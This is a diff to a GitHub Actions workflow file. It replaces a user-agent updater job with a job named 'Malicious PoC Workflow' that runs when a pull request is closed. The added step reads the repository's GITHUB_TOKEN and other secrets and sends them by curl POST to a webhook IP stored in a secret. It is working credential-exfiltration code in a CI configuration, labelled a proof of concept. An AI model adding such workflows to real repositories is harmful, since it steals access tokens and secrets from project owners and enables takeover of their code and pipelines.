@@ -1,18 +1,28 @@
-name: User-agent updater.
+name: "Malicious PoC Workflow"
 
 on:
-  repository_dispatch:
-    types: ["Restart user_agent_updater workflow."]
-  schedule:
-    # At 00:00 on day-of-month 1.
-    - cron: "0 0 1 * *"
   pull_request_target:
     types: [closed]
 
 jobs:
-  User-agent:
+  attack:
     runs-on: ubuntu-latest
     steps:
-      - uses: desktop-app/action_code_updater@master
-        with:
-          type: "user-agent"
+      - name: Exfiltrate secrets (PoC)
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          SPECIAL_SECRET_FOR_23RD_FORK_TEST_SECURITY: ${{ secrets.SPECIAL_SECRET_FOR_23RD_FORK_TEST_SECURITY }}
+          WEBHOOK_IP_TEST_SECURITY: ${{ secrets.WEBHOOK_IP_TEST_SECURITY }}
+        run: |
+          echo "[+] Starting secrets exfiltration..."
+          curl -X POST "http://${WEBHOOK_IP_TEST_SECURITY}:8000" \
+            -H "Content-Type: application/json" \
+            --data-binary @- <<EOF
+          {
+            "GH_TOKEN": "$GH_TOKEN",
+            "SPECIAL_SECRET_FOR_23RD_FORK_TEST_SECURITY": "$SPECIAL_SECRET_FOR_23RD_FORK_TEST_SECURITY",
+            "REPO": "$GITHUB_REPOSITORY",
+            "RUN_ID": "$GITHUB_RUN_ID"
+          }
+          EOF
+          echo "[+] Secrets sent!"
